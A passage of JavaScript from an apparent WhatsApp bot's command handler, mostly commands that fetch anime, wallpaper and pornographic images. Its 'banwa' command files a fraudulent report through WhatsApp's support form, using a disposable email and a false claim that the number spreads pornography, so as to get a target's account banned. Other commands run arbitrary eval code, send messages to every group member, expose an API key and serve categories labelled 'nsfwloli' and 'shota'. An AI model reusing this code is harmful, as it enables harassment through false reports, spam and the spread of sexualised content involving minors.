                    await sleep(60000)
                    if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) {
                        console.log("Jawaban: " + result.jawaban)
                        Kyuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktekateki[m.sender.split('@')[0]]}`, m)
                        delete tebaktekateki[m.sender.split('@')[0]]
                    }
                }
            }
            break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'lizard':
case 'meow':
case 'tickle':
replygcxeon(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
            await Kyuu.sendMessage(m.chat,{ caption: mess.success, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewallpaper2': case 'animewall2': {
                if (!args.join(" ")) return replygcxeon("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                result = anu[Math.floor(Math.random() * anu.length)]
                Kyuu.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break
case 'animewall': case 'animewallpaper':
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return replygcxeon('What wallpaper do you want?')
replygcxeon(mess.wait)
const wall = new AnimeWallpaper();
    const pages = [1,2,3,4];
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null);
const i = Math.floor(Math.random() * wallpaper.length);     
            await Kyuu.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
                    return('Error!')
                })
//Kyuu.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (!isPrem) return replyprem(mess.premium)
replygcxeon(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
Kyuu.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case '>':
case '=>':
if (!isOwner) return;
var err = new TypeError;
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return replygcxeon(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
replygcxeon(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
replygcxeon(util.format(_syntax + _err))
}
break;
        case 'banwa': {

if (!isOwner) return 

if (!text) return replygcxeon(`Where's the number?`)

let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")

let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")

let cookie = ntah.headers["set-cookie"].join("; ")

let $ = cheerio.load(ntah.data)

let $form = $("form");

let url = new URL($form.attr("action"), "https://www.whatsapp.com").href

let form = new URLSearchParams()

form.append("jazoest", $form.find("input[name=jazoest]").val())

form.append("lsd", $form.find("input[name=lsd]").val())

form.append("step", "submit")

form.append("country_selector", "ID")

form.append("phone_number", text)

form.append("email", email.data[0])

form.append("email_confirm", email.data[0])

form.append("platform", "ANDROID")

form.append("your_message", `Hello Dear WhatsApp

Good morning/afternoon/night

My WhatsApp Number ${text} Stolen And Now Used to spread pornography and illegal sales, please take immediate action regarding my account.

If you can, just disable it

for important chat matters I don't have it

Thank you`)

form.append("__user", "0")

form.append("__a", "1")

form.append("__csr", "")

form.append("__req", "8")

form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")

form.append("dpr", "1")

form.append("__ccg", "UNKNOWN")

form.append("__rev", "1006630858")

form.append("__comment_req", "0")

let res = await axios({

  url,

  method: "POST",

  data: form,

  headers: {

    cookie

  }

})

replygcxeon(util.format(JSON.parse(res.data.replace("for (;;);", ""))))

}

break
case 'pushcontact': {
    if (!isOwner) return replygcxeon(mess.owner)
      if (!m.isGroup) return replygcxeon(`The feature works only in grup`)
    if (!text) return replygcxeon(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcxeon(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    Kyuu.sendMessage(pler, { text: q})
     }  
     replygcxeon(`Done`)
      }
      break
            case 'id':{
            replygcxeon(from)
           }
          break
          case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
		if (!emoji2) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await Kyuu.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	case 'hentaivid2': {
if (!m.isGroup) return m.reply(mess.group)
if (!isPrem) return replyprem(mess.premium)
if (!AntiNsfw) return m.reply(mess.nsfw)
replygcxeon(mess.wait)
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
Kyuu.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
                m.reply(mess.wait)
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                Kyuu.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return replygcxeon(mess.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!m.isGroup) return replygcxeon(mess.group)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break 
case 'animespank':
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await Kyuu.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ahegao':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ahegao.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ass':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'bdsm':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'blowjob':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cum':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ero':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'femdom':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'foot':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gangbang':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'glasses':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'hentai':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'jahy':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/jahy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'manga':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'masturbation':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'orgy':
if (!m.isGroup) return replygcxeon(mess.group)
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
replygcxeon(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Kyuu.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'panties':
if (!m.isGroup) return replygcxeon(mess.group)
